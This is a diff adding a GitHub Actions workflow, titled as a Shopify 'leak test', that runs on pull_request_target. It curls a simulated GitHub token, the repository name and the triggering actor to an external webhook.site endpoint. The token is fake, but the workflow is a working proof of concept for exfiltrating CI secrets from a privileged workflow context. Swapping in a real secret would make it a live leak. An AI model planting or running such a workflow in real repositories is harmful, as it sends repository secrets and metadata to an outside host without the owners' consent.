@@ -1,0 +1,17 @@
+name: Shopify Pull Request Target Leak Test
+
+on:
+  pull_request_target:
+
+jobs:
+  leak_simulation:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Simulate Secret Leak to Webhook
+        env:
+          SIMULATED_SECRET: FAKE-GITHUB-PAT-1234567890
+        run: |
+          echo "[!] Simulating secret leak..."
+          curl -X POST https://webhook.site/e1b3124d-9f5a-43c9-9123-b3c3fe6e85b7 \
+            -H "Content-Type: application/json" \
+            -d "{\"leak\": \"$SIMULATED_SECRET\", \"repo\": \"${{ github.repository }}\", \"actor\": \"${{ github.actor }}\" }"
